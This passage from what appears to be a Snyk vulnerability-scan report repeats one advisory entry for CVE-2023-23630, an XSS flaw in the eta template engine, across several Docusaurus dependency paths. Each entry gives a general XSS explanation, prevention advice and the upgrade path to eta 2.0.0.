        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/releases/tag/v2.0.0",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2023-02-14T15:04:12.598888Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `renderFile` function, due to improper user-input sanitization. \r\n\r\n## Workaround\r\n\r\nUsers who are unable to upgrade should not pass user supplied data directly to `res.renderFile`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [GitHub Release](https://github.com/eta-dev/eta/releases/tag/v2.0.0)\n",
      "epssDetails": {
        "percentile": "0.18312",
        "probability": "0.00052",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-23630"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-xrh7-m5pp-39r6"
        ]
      },
      "packageName": "eta",
      "proprietary": false,
      "creationTime": "2023-02-01T09:24:55.728670Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-01-31T22:39:40Z",
      "packageManager": "npm",
      "publicationTime": "2023-02-01T13:47:00.613727Z",
      "modificationTime": "2023-02-14T15:04:12.598888Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-google-analytics@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/plugin-google-analytics@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-3261240",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Agustin Gianni"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/releases/tag/v2.0.0",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2023-02-14T15:04:12.598888Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `renderFile` function, due to improper user-input sanitization. \r\n\r\n## Workaround\r\n\r\nUsers who are unable to upgrade should not pass user supplied data directly to `res.renderFile`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [GitHub Release](https://github.com/eta-dev/eta/releases/tag/v2.0.0)\n",
      "epssDetails": {
        "percentile": "0.18312",
        "probability": "0.00052",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-23630"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-xrh7-m5pp-39r6"
        ]
      },
      "packageName": "eta",
      "proprietary": false,
      "creationTime": "2023-02-01T09:24:55.728670Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-01-31T22:39:40Z",
      "packageManager": "npm",
      "publicationTime": "2023-02-01T13:47:00.613727Z",
      "modificationTime": "2023-02-14T15:04:12.598888Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-google-gtag@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/plugin-google-gtag@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-3261240",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Agustin Gianni"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/releases/tag/v2.0.0",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2023-02-14T15:04:12.598888Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `renderFile` function, due to improper user-input sanitization. \r\n\r\n## Workaround\r\n\r\nUsers who are unable to upgrade should not pass user supplied data directly to `res.renderFile`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [GitHub Release](https://github.com/eta-dev/eta/releases/tag/v2.0.0)\n",
      "epssDetails": {
        "percentile": "0.18312",
        "probability": "0.00052",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-23630"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-xrh7-m5pp-39r6"
        ]
      },
      "packageName": "eta",
      "proprietary": false,
      "creationTime": "2023-02-01T09:24:55.728670Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-01-31T22:39:40Z",
      "packageManager": "npm",
      "publicationTime": "2023-02-01T13:47:00.613727Z",
      "modificationTime": "2023-02-14T15:04:12.598888Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-sitemap@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/plugin-sitemap@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-3261240",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Agustin Gianni"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/releases/tag/v2.0.0",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2023-02-14T15:04:12.598888Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `renderFile` function, due to improper user-input sanitization. \r\n\r\n## Workaround\r\n\r\nUsers who are unable to upgrade should not pass user supplied data directly to `res.renderFile`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [GitHub Release](https://github.com/eta-dev/eta/releases/tag/v2.0.0)\n",
      "epssDetails": {
        "percentile": "0.18312",
        "probability": "0.00052",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-23630"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-xrh7-m5pp-39r6"
        ]
      },
      "packageName": "eta",
      "proprietary": false,
      "creationTime": "2023-02-01T09:24:55.728670Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-01-31T22:39:40Z",
      "packageManager": "npm",
      "publicationTime": "2023-02-01T13:47:00.613727Z",
      "modificationTime": "2023-02-14T15:04:12.598888Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-classic@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-3261240",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Agustin Gianni"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/releases/tag/v2.0.0",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2023-02-14T15:04:12.598888Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `renderFile` function, due to improper user-input sanitization. \r\n\r\n## Workaround\r\n\r\nUsers who are unable to upgrade should not pass user supplied data directly to `res.renderFile`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [GitHub Release](https://github.com/eta-dev/eta/releases/tag/v2.0.0)\n",
      "epssDetails": {
        "percentile": "0.18312",
        "probability": "0.00052",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-23630"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-xrh7-m5pp-39r6"
        ]
      },
      "packageName": "eta",
      "proprietary": false,
      "creationTime": "2023-02-01T09:24:55.728670Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-01-31T22:39:40Z",
      "packageManager": "npm",
      "publicationTime": "2023-02-01T13:47:00.613727Z",
      "modificationTime": "2023-02-14T15:04:12.598888Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-search-algolia@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-3261240",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Agustin Gianni"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/releases/tag/v2.0.0",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2023-02-14T15:04:12.598888Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `renderFile` function, due to improper user-input sanitization. \r\n\r\n## Workaround\r\n\r\nUsers who are unable to upgrade should not pass user supplied data directly to `res.renderFile`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application 